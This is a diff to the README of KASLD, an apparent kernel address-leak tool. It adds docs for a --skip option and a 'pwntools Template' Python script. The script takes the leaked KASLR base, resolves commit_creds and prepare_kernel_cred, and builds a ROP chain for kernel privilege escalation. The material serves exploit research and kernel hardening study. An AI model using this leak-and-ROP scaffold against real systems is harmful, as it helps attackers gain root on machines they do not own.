@@ -31,6 +31,7 @@ Supports:
 
 * [Usage](#usage)
   * [Example Output](#example-output)
+  * [pwntools Template](#pwntools-template)
   * [Explain mode](#explain-mode)
   * [Hardening assessment](#hardening-assessment)
 * [Building](#building)
@@ -200,6 +201,56 @@ Physical memory layout:
 
 </details>
 
+### pwntools Template
+
+The `--json` (`-j`) flag emits machine-readable output. The
+`kaslr.virtual.text_base` field contains the leaked kernel text base as
+a hex string, and `kaslr.virtual.slide_bytes` contains the KASLR slide
+as an integer. Both can be consumed directly by pwntools to resolve
+runtime symbol addresses and build a ROP chain.
+
+```python
+#!/usr/bin/env python3
+import json, subprocess, sys
+from pwn import *
+
+# Leak kernel base with KASLD
+result = subprocess.run(
+  [
+    "./build/x86_64-linux-gnu/kasld",
+    "--json",
+    "--fast",
+    "--quiet"
+  ],
+  capture_output=True,
+  text=True
+)
+data = json.loads(result.stdout)
+context.arch = {"x86_64": "amd64"}.get(data["arch"], data["arch"])
+kaslr = data["kaslr"].get("virtual")
+if not kaslr:
+    log.failure("kasld did not find the kernel text base")
+    sys.exit(1)
+text_base = int(kaslr["text_base"], 16)
+slide     = int(kaslr["slide_bytes"])
+log.success(f"kernel text base: {hex(text_base)}  (slide +{hex(slide)})")
+
+# Resolve runtime addresses via vmlinux symbol table
+vmlinux = ELF("vmlinux", checksec=False)
+vmlinux.address = text_base
+commit_creds        = vmlinux.symbols["commit_creds"]
+prepare_kernel_cred = vmlinux.symbols["prepare_kernel_cred"]
+log.info(f"commit_creds:        {hex(commit_creds)}")
+log.info(f"prepare_kernel_cred: {hex(prepare_kernel_cred)}")
+
+# Build ROP chain
+rop = ROP(vmlinux)
+rop.call(prepare_kernel_cred, [0])
+# move rax -> rdi here with a target-specific gadget
+# rop.raw(rop.find_gadget(["mov rdi, rax", "ret"]).address)
+rop.call(commit_creds)
+payload = flat(rop.chain())
+```
 
 ### Explain mode
 
@@ -287,6 +338,7 @@ Command-line options:
 -f, --fast          Use 2s per-component timeout (fast scan mode)
 -w, --workers N     Parallel inference workers (default: nproc; 0 = sequential)
 -x, --experimental  Enable experimental components
+-s, --skip PATTERN  Skip matching components (glob, comma-separated; multiple --skip flags accumulate)
 -H, --hardening     Show post-run hardening assessment
 -t, --timeout N     Per-component timeout in seconds (default: 30)
 -V, --version       Print version and exit
@@ -386,6 +438,14 @@ requirements, very long runtimes, or significant noise. Pass
 `--experimental` (`-x`) to include them. The number of skipped
 components is noted in the "Running N components..." line. Setting
 `KASLD_EXPERIMENTAL=1` in the environment has the same effect.
+
+Pass `--skip PATTERN` (`-s`) to exclude one or more components by name.
+Patterns use `fnmatch(3)` glob syntax — e.g. `--skip 'dmesg_*'` skips all
+components whose name starts with `dmesg_`. Comma-separate multiple patterns
+in a single flag or repeat the flag to accumulate them:
+`--skip dmesg_backtrace,dmesg_e820` and `--skip dmesg_backtrace --skip dmesg_e820`
+are equivalent. The number of skipped components is noted in the
+"Running N components..." line.
 
 ### Cross-section derivation
 
